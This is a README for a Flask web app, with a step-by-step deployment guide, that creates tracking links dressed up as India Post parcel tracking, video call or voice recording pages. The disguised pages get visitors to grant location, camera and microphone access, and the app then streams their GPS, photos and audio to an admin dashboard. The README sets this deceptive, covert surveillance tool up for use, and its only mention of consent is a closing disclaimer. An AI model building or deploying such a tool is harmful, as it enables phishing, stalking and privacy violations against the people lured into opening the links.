# Indianpost-Parcel-Tracker

A lightweight **Flask** web application for creating shareable, token-based live tracking links. Each link can request a visitor's **location, camera, or microphone** and stream that data (GPS, photos, audio) to your admin dashboard in real time.

Built with **Supabase** (PostgreSQL + Storage), deployed on **Render** (free tier), and works on any device with a browser.

---

## ✨ Features

- **Admin dashboard** — create, manage, and revoke tracking links
- **Per-link toggles** — independently enable:
  - 📍 **Location** (GPS with accuracy, speed, altitude, battery)
  - 📷 **Camera** (front camera, time-lapse photos every N seconds)
  - 🎙 **Microphone** (continuous audio, saved every 10s)
- **Themed landing pages** — auto-selected per link:
  - Location → **Package tracking** page with live map
  - Camera → **Video call** page with live preview
  - Mic → **Voice recording** page with waveform
- **Supabase backend** — PostgreSQL database, file storage, Row Level Security
- **Free hosting** — runs on Render free tier + Supabase free tier
- **HTTPS by default** — required for camera/mic/location permissions

---

## 📋 Prerequisites

| Service | Account | Free Tier Limits |
|---------|---------|------------------|
| **Supabase** | https://supabase.com | 500 MB DB, 1 GB storage, 2 GB bandwidth/mo |
| **Render** | https://render.com | Free web service (spins down after 15 min inactivity) |
| **GitHub** | https://github.com | Unlimited public/private repos |

---

## 🚀 Complete Deployment Guide

### 1. Supabase Setup

1. **Create a new project** at https://supabase.com/dashboard
   - Note your **Project URL** and **API keys** (Settings → API)

2. **Run the database schema**
   - Go to **SQL Editor** → New Query
   - Copy/paste the contents of `supabase_schema.sql` from this repo
   - Click **Run**
   - This creates tables (`links`, `reports`, `media`), indexes, RLS policies, and the `tracker-media` storage bucket

3. **Verify setup**
   - **Table Editor** → check `links`, `reports`, `media` exist
   - **Authentication → Policies** → verify anon policies on all tables
   - **Storage** → confirm `tracker-media` bucket exists with policies

---

### 2. Local Development (Use CMD)

```bash
# Clone the repo
git clone https://github.com/creep-xeditz/Indianpost-Parcel-Tracker.git
cd Indianpost-Parcel-Tracker

# Create virtual environment
python -m venv venv
# Windows:
venv\Scripts\activate
# macOS/Linux:
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Create .env from template
copy .env.example .env
# Edit .env with your Supabase credentials (see below)

# Run locally
python app.py
```

Open http://localhost:5000 → login with your `ADMIN_USER` / `ADMIN_PASS`

---

### 3. Environment Variables (`.env`)

| Variable | Description | Example |
|----------|-------------|---------|
| `SECRET_KEY` | Flask session secret (generate with `python -c "import secrets; print(secrets.token_hex(32))"`) | `f8bcf511f9a8fa9fd1864b8a6a4bc4457499a7f2a486977b5064c93db67ec510` |
| `FLASK_ENV` | `development` (local) or `production` (Render) | `development` |
| `ADMIN_USER` | Dashboard username | `admin` |
| `ADMIN_PASS` | Dashboard password | `your-secure-password` |
| `SUPABASE_URL` | From Supabase Settings → API | `https://pdzmyoqvwmgtoyffpnmu.supabase.co` |
| `SUPABASE_ANON_KEY` | `anon` `public` key (JWT) | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` |
| `SUPABASE_SERVICE_KEY` | `service_role` `secret` key (JWT) — **keep private!** | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` |
| `SUPABASE_STORAGE_BUCKET` | Storage bucket name | `tracker-media` |

> **Never commit `.env`** — it's in `.gitignore`

---

### 4. Deploy to Render

1. **Push to GitHub** (this repo is already set up)

2. **Create Render Web Service**
   - Go to https://dashboard.render.com → **New +** → **Web Service**
   - Connect your GitHub repo: `Indianpost-Parcel-Tracker`
   - Settings:
     - **Name**: `indianpost-parcel-tracker` (or your choice)
     - **Region**: Oregon (or closest)
     - **Branch**: `main`
     - **Build Command**: `pip install -r requirements.txt`
     - **Start Command**: `gunicorn app:app`
     - **Plan**: Free

3. **Add Environment Variables** in Render dashboard (same as `.env` above, but `FLASK_ENV=production`)

4. **Deploy** — Render builds and starts the service
   - Your app will be live at `https://<name>.onrender.com`

---

### 5. Post-Deploy Verification

| Check | URL | Expected |
|-------|-----|----------|
| Health endpoint | `https://<app>.onrender.com/healthz` | `{"status":"ok",...}` |
| Dashboard login | `https://<app>.onrender.com/` | Login page |
| Create a link | Dashboard → "Create tracking link" | Generates `/t/<token>` URL |
| Test client page | Open `/t/<token>` on phone (HTTPS) | Themed page loads, permissions work |

---

## 🔧 How It Works

1. **Admin** creates a link in dashboard with desired permissions (location/cam/mic)
2. **Visitor** opens the `/t/<token>` link on their phone (must be HTTPS)
3. **Browser prompts** for only the enabled permissions (native OS dialog)
4. **Data streams** to Supabase: GPS → `reports`, photos/audio → `tracker-media` bucket
5. **Admin** sees live data in dashboard: map, reports table, media gallery, charts

---

## 📁 Project Structure

```
Indianpost-Parcel-Tracker/
├── app.py                 # Flask app (Supabase backend)
├── render.yaml            # Render deploy config
├── requirements.txt       # Python deps
├── supabase_schema.sql    # Database schema + RLS + storage
├── .env.example           # Env template
├── .env                   # Local env (gitignored)
├── templates/
│   ├── login.html         # Admin login
│   ├── dashboard.html     # Admin console
│   └── client.html        # Visitor page (track/call/rec themes)
└── README.md              # This file
```

---

## 🔐 Security Notes

- **RLS policies** ensure anon users can only:
  - Read active links (for `/t/<token>`)
  - Insert reports/media for valid tokens
- **Service role** key used only server-side (Render env var)
- **Signed URLs** for media access (1-hour expiry)
- **Admin auth** via session cookie (change default password!)

---

## 🛠 Troubleshooting

| Issue | Fix |
|-------|-----|
| Camera/mic/location not working | Must use **HTTPS** (Render provides this) |
| "Supabase credentials not configured" | Check Render env vars match `.env` exactly |
| Media upload fails | Verify `tracker-media` bucket + policies in Supabase |
| Dashboard shows no data | Check RLS policies allow anon insert on `reports`/`media` |
| Render spins down | Free tier spins down after 15 min inactivity; first request wakes it (30s delay) |

---

## 📄 License

MIT — use responsibly and only with proper authorization. You are responsible for complying with all applicable laws and obtaining consent from anyone whose data you collect.

---

## 🙏 Credits

Built with Flask, Supabase, Leaflet, and deployed on Render.

## 😇  Original Creator

Linuxndroid
